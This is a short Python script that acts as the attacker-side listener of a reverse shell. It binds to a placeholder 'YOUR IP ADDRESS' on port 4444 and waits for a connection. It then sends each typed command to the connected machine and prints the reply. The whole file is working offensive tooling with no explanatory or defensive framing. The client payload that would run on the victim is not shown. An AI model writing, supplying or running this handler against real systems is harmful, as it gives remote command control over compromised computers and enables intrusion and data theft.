import socket
import sys

sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Socket created...")

LHOST = "YOUR IP ADDRESS"
LPORT = 4444

try:
    sk.bind((LHOST, LPORT))
    sk.listen(5)
    print(f"Listening on Port {LPORT}...")
except Exception as e:
    print(f"Failed to listen... : {e}")

try:
    (client_socket, client_address) = sk.accept()
    print(f"Connection established with {client_address}")
except Exception as e:
    print(f"Connection Failed: {e}")

try:
    while True:
        command = input("> ")
        if command == "exit":   
            sk.close()
            sys.exit(1)
            break
        request = client_socket.send(command.encode("utf-8"))
        response =  client_socket.recv(1024).decode()
        print(response)
except Exception as e:
    print("Something went wrong...")
except KeyboardInterrupt as k:
    print(f"Connection ended due to {k}")

client_socket.close()

sk.close()
